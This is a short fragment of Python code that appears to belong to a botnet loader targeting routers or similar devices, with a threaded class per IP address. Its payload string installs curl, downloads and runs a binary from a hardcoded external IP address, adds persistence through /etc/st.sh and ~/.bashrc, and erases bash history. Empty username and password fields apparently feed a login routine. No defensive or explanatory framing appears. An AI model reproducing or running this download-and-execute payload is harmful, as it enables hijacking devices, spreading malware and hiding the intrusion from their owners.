...
class router(threading.Thread):
    def __init__ (self, ip):
        ...
        self.rekdevice="apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://95.140.152.76:1339/SXkmarwet7vghj -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history" #<---Payload Goes In Between The ---> "" 
    def run(self):
        global fh
        username = ""
        password = ""
